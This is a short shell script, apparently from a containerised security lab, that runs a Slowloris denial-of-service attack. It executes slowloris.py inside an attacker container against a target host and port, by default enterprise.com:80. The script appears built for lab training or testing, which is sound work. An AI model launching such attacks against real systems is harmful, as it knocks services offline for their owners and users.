#!/bin/sh

set -e

# ./dos_slowloris.sh clab-virtual-env-attacker
# ./dos_slowloris.sh clab-virtual-env-attacker 172.16.30.2 80

# If called with -n, return the menu name
if [ "$1" = "-n" ]; then
    echo "DoS | Slowloris"
    exit 0
fi

# Ensure the name of the container is specified
if [ -z "$1" ]; then
    echo "Usage: $0 <attacker-container> [target] [port]"
    exit 1
fi

ATTACKER_CONTAINER="$1"
TARGET="${2:-enterprise.com}"
PORT="${3:-80}"

echo "================================"
echo "Attack: DoS (Slowloris)"
echo "Target: $TARGET"
echo "Port: $PORT"
echo "Attacker container: $ATTACKER_CONTAINER"
echo "================================"

# Call the corresponding python code
docker exec "$ATTACKER_CONTAINER" python3 /security/slowloris.py "$TARGET" "$PORT"
